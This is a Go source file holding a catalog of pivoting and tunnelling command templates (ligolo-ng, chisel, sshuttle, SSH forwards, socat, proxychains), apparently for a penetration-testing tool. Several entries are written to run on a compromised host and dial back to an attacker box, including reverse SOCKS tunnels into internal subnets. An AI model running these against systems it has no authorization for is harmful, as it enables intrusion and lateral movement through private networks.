package main

// pivotingCatalog holds the tunnelling / pivoting tools you reach for once you
// have a foothold and need to reach an internal network from your attack box:
// ligolo-ng, chisel, sshuttle, raw SSH port-forwards, and socat/proxychains.
//
// Most of these are two-sided: one command runs on the attacker and a matching
// one on the compromised host. The entries are named "(attacker)" / "(target)"
// so you know where each belongs. Values woven into the middle of a command
// (listener host/port, pivot subnet) use {PLACEHOLDER} flags, substituted in
// place; trailing switches are ordinary flags.
var pivotingCatalog = []Tool{
	// ── ligolo-ng ──────────────────────────────────────────────────────────
	// Modern tun-based pivot: the proxy runs on the attacker and presents a
	// virtual interface; the agent runs on the target and dials back. Route the
	// target's subnet through the ligolo interface, then reach it natively (no
	// proxychains needed).
	{
		Name: "ligolo: proxy (attacker)", Binary: "./proxy -selfcert", Category: "ligolo",
		Desc: "Start the ligolo-ng proxy with a self-signed cert and the interactive console",
		Flags: []Flag{
			{Flag: "-laddr", Name: "Listen addr", Kind: KindString,
				Placeholder: "0.0.0.0:11601", Desc: "Address:port the agents connect back to (default 0.0.0.0:11601)"},
			{Flag: "-selfcert", Name: "Self-signed cert", Kind: KindBool, Enabled: true,
				Desc: "Auto-generate a TLS cert (skip -certfile/-keyfile)"},
			{Flag: "-certfile", Name: "Cert file", Kind: KindString,
				Placeholder: "server.crt", Desc: "Use this TLS certificate instead of a self-signed one"},
			{Flag: "-keyfile", Name: "Key file", Kind: KindString,
				Placeholder: "server.key", Desc: "Private key matching -certfile"},
			{Flag: "-v", Name: "Verbose", Kind: KindBool, Desc: "Verbose logging"},
		},
	},
	{
		Name: "ligolo: agent (target)", Binary: "./agent -connect {LHOST}:{LPORT}", Category: "ligolo",
		Desc: "Run on the compromised host to dial back to the ligolo proxy",
		Flags: []Flag{
			{Flag: "{LHOST}", Name: "Proxy host", Kind: KindString, Required: true,
				Placeholder: "10.10.14.7", Desc: "Your attack box (where the proxy listens)"},
			{Flag: "{LPORT}", Name: "Proxy port", Kind: KindString, Required: true,
				Placeholder: "11601", Desc: "Proxy listener port"},
			{Flag: "-ignore-cert", Name: "Ignore cert", Kind: KindBool, Enabled: true,
				Desc: "Skip TLS verification (needed with -selfcert on the proxy)"},
			{Flag: "-retry", Name: "Retry", Kind: KindBool,
				Desc: "Keep retrying the connection if it drops"},
		},
	},
	{
		Name: "ligolo: add route (attacker)",
		Binary:   "sudo ip route add {SUBNET} dev ligolo",
		Category: "ligolo",
		Desc:     "Route a target subnet through the ligolo interface (run `interface_create --name ligolo` + `start` in the console first)",
		Flags: []Flag{
			{Flag: "{SUBNET}", Name: "Target subnet", Kind: KindString, Required: true,
				Placeholder: "172.16.1.0/24", Desc: "Internal subnet (CIDR) reachable from the agent"},
		},
	},
	{
		Name: "ligolo: tun interface (attacker)",
		Binary:   "sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up",
		Category: "ligolo",
		Desc:     "Create and bring up the `ligolo` tun interface (one-time host setup)",
		Flags:    []Flag{},
	},

	// ── chisel ─────────────────────────────────────────────────────────────
	// Fast TCP/UDP tunnel over HTTP. Classic reverse SOCKS: run the server on
	// the attacker and a reverse client on the target, then point proxychains at
	// the local SOCKS port.
	{
		Name: "chisel: server (attacker)", Binary: "chisel server --reverse", Category: "chisel",
		Desc: "Attacker-side chisel server accepting reverse tunnels",
		Flags: []Flag{
			{Flag: "-p", Name: "Port", Kind: KindString, Required: true,
				Placeholder: "8000", Desc: "Port the chisel clients connect to"},
			{Flag: "--reverse", Name: "Reverse", Kind: KindBool, Enabled: true,
				Desc: "Allow clients to request reverse tunnels (R:...)"},
			{Flag: "--socks5", Name: "SOCKS5", Kind: KindBool,
				Desc: "Enable the built-in SOCKS5 proxy endpoint"},
		},
	},
	{
		Name:     "chisel: reverse SOCKS (target)",
		Binary:   "chisel client {LHOST}:{PORT} R:{SOCKS}:socks",
		Category: "chisel",
		Desc:     "Target dials back and opens a reverse SOCKS proxy on the attacker's SOCKS port",
		Flags: []Flag{
			{Flag: "{LHOST}", Name: "Server host", Kind: KindString, Required: true,
				Placeholder: "10.10.14.7", Desc: "Attacker IP running the chisel server"},
			{Flag: "{PORT}", Name: "Server port", Kind: KindString, Required: true,
				Placeholder: "8000", Desc: "chisel server port"},
			{Flag: "{SOCKS}", Name: "SOCKS port", Kind: KindString, Required: true,
				Placeholder: "1080", Desc: "Local SOCKS port opened on the attacker (point proxychains here)"},
		},
	},
	{
		Name:     "chisel: reverse port-forward (target)",
		Binary:   "chisel client {LHOST}:{PORT} R:{RPORT}:{THOST}:{TPORT}",
		Category: "chisel",
		Desc:     "Forward a single internal host:port back to a port on the attacker",
		Flags: []Flag{
			{Flag: "{LHOST}", Name: "Server host", Kind: KindString, Required: true,
				Placeholder: "10.10.14.7", Desc: "Attacker IP running the chisel server"},
			{Flag: "{PORT}", Name: "Server port", Kind: KindString, Required: true,
				Placeholder: "8000", Desc: "chisel server port"},
			{Flag: "{RPORT}", Name: "Local port", Kind: KindString, Required: true,
				Placeholder: "3389", Desc: "Port opened on the attacker"},
			{Flag: "{THOST}", Name: "Internal host", Kind: KindString, Required: true,
				Placeholder: "172.16.1.20", Desc: "Internal target reachable from the pivot"},
			{Flag: "{TPORT}", Name: "Internal port", Kind: KindString, Required: true,
				Placeholder: "3389", Desc: "Port on the internal target"},
		},
	},

	// ── sshuttle ───────────────────────────────────────────────────────────
	{
		Name:     "sshuttle: subnet VPN (attacker)",
		Binary:   "sshuttle -r {USER}@{HOST} {SUBNET}",
		Category: "ssh",
		Desc:     "Transparent 'poor man's VPN' over SSH — route a subnet through a box you can SSH to",
		Flags: []Flag{
			{Flag: "{USER}", Name: "SSH user", Kind: KindString, Required: true,
				Placeholder: "user", Desc: "Username on the pivot host"},
			{Flag: "{HOST}", Name: "Pivot host", Kind: KindString, Required: true,
				Placeholder: "10.10.11.23", Desc: "Host you can SSH into (the pivot)"},
			{Flag: "{SUBNET}", Name: "Subnet(s)", Kind: KindString, Required: true,
				Placeholder: "172.16.1.0/24", Desc: "Internal subnet(s) to route through the pivot"},
			{Flag: "--dns", Name: "Tunnel DNS", Kind: KindBool,
				Desc: "Also route DNS queries through the pivot"},
			{Flag: "-x", Name: "Exclude", Kind: KindString,
				Placeholder: "10.10.11.23", Desc: "Exclude a host/subnet from the tunnel (e.g. the pivot itself)"},
		},
	},

	// ── raw SSH port-forwards ──────────────────────────────────────────────
	{
		Name:     "ssh: dynamic SOCKS (-D)",
		Binary:   "ssh -D {SOCKS} -N {USER}@{HOST}",
		Category: "ssh",
		Desc:     "Open a local SOCKS proxy that tunnels through the SSH host (point proxychains at it)",
		Flags: []Flag{
			{Flag: "{SOCKS}", Name: "SOCKS port", Kind: KindString, Required: true,
				Placeholder: "1080", Desc: "Local SOCKS port opened on the attacker"},
			{Flag: "{USER}", Name: "SSH user", Kind: KindString, Required: true,
				Placeholder: "user", Desc: "Username on the SSH/pivot host"},
			{Flag: "{HOST}", Name: "SSH host", Kind: KindString, Required: true,
				Placeholder: "10.10.11.23", Desc: "Host to tunnel through"},
		},
	},
	{
		Name:     "ssh: local forward (-L)",
		Binary:   "ssh -L {LPORT}:{THOST}:{TPORT} -N {USER}@{HOST}",
		Category: "ssh",
		Desc:     "Expose an internal host:port on a local port of the attacker",
		Flags: []Flag{
			{Flag: "{LPORT}", Name: "Local port", Kind: KindString, Required: true,
				Placeholder: "8080", Desc: "Port opened on the attacker"},
			{Flag: "{THOST}", Name: "Internal host", Kind: KindString, Required: true,
				Placeholder: "172.16.1.20", Desc: "Internal target (as seen from the pivot)"},
			{Flag: "{TPORT}", Name: "Internal port", Kind: KindString, Required: true,
				Placeholder: "80", Desc: "Port on the internal target"},
			{Flag: "{USER}", Name: "SSH user", Kind: KindString, Required: true,
				Placeholder: "user", Desc: "Username on the pivot host"},
			{Flag: "{HOST}", Name: "Pivot host", Kind: KindString, Required: true,
				Placeholder: "10.10.11.23", Desc: "SSH/pivot host"},
		},
	},
	{
		Name:     "ssh: remote forward (-R)",
		Binary:   "ssh -R {RPORT}:{THOST}:{TPORT} -N {USER}@{HOST}",
		Category: "ssh",
		Desc:     "Expose an attacker-side host:port on a port of the remote SSH host (reverse)",
		Flags: []Flag{
			{Flag: "{RPORT}", Name: "Remote port", Kind: KindString, Required: true,
				Placeholder: "8080", Desc: "Port opened on the remote/pivot host"},
			{Flag: "{THOST}", Name: "Local host", Kind: KindString, Required: true,
				Placeholder: "127.0.0.1", Desc: "Host reachable from the attacker to expose"},
			{Flag: "{TPORT}", Name: "Local port", Kind: KindString, Required: true,
				Placeholder: "80", Desc: "Port on that host"},
			{Flag: "{USER}", Name: "SSH user", Kind: KindString, Required: true,
				Placeholder: "user", Desc: "Username on the pivot host"},
			{Flag: "{HOST}", Name: "Pivot host", Kind: KindString, Required: true,
				Placeholder: "10.10.11.23", Desc: "SSH/pivot host"},
		},
	},

	// ── socat / proxychains ────────────────────────────────────────────────
	{
		Name:     "socat: TCP relay",
		Binary:   "socat TCP-LISTEN:{LPORT},fork,reuseaddr TCP:{THOST}:{TPORT}",
		Category: "relay",
		Desc:     "Forward a local listening port to an internal host:port (drop on a pivot box)",
		Flags: []Flag{
			{Flag: "{LPORT}", Name: "Listen port", Kind: KindString, Required: true,
				Placeholder: "8080", Desc: "Port socat listens on"},
			{Flag: "{THOST}", Name: "Target host", Kind: KindString, Required: true,
				Placeholder: "172.16.1.20", Desc: "Internal target to relay to"},
			{Flag: "{TPORT}", Name: "Target port", Kind: KindString, Required: true,
				Placeholder: "80", Desc: "Port on the internal target"},
		},
	},
	{
		Name:     "proxychains: run through SOCKS",
		Binary:   "proxychains4 -q {CMD}",
		Category: "relay",
		Desc:     "Run any tool through the SOCKS proxy in /etc/proxychains4.conf (set socks5 127.0.0.1 <port> there first)",
		Flags: []Flag{
			{Flag: "{CMD}", Name: "Command", Kind: KindString, Required: true,
				Placeholder: "nmap -sT -Pn -p 445 172.16.1.20", Desc: "The command to tunnel (TCP-connect tools only)"},
		},
	},
}
